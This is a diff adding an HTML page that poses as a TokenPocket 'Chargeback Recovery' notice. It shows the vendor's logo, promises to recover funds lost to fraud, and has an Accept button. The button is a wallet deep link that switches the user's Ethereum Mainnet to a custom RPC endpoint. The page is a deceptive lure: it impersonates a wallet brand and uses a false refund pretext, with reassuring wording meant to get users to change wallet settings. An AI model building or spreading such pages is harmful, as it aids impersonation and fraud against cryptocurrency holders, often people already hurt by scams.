@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Chargeback Recovery - TokenPocket</title>
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: #f8f9fc;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      color: #1e1e1e;
+    }
+    .container {
+      background: #fff;
+      max-width: 420px;
+      margin: 40px 16px;
+      padding: 24px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      text-align: center;
+    }
+    .logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+    h2 {
+      color: #2f5af2;
+      margin-bottom: 16px;
+    }
+    p {
+      text-align: left;
+      font-size: 15px;
+      line-height: 1.6;
+    }
+    .btn-accept {
+      margin-top: 24px;
+      background: #2f5af2;
+      color: #fff;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .btn-accept:hover {
+      background: #1c3cd6;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://cdn.prod.website-files.com/644a3d469d569d0a4b4c96db/6672c3e18b3a53b61cd8db9c_5947.png" alt="TokenPocket Logo" class="logo" />
+    <h2>Chargeback Terms & Conditions</h2>
+    <p>
+      1. You confirm that you are the rightful owner of the wallet address receiving the chargeback.<br/><br/>
+      2. This process is designed to help recover funds lost due to fraud or unauthorized transactions.<br/><br/>
+      3. To complete recovery, your TokenPocket wallet must connect to a secure Ethereum node.<br/><br/>
+      4. By clicking <strong>Accept</strong>, you agree to switch your Ethereum Mainnet to the trusted Ankr connection.<br/><br/>
+      5. Your private key or recovery phrase will never be requested — wallet security remains under your control.
+    </p>
+    <a class="btn-accept" href="tp://addCustomRPC?rpc=https://rpc.ankr.com/eth&chainId=1&name=Ethereum%20Mainnet&symbol=ETH&explorer=https://etherscan.io">Accept</a>
+  </div>
+</body>
+</html>
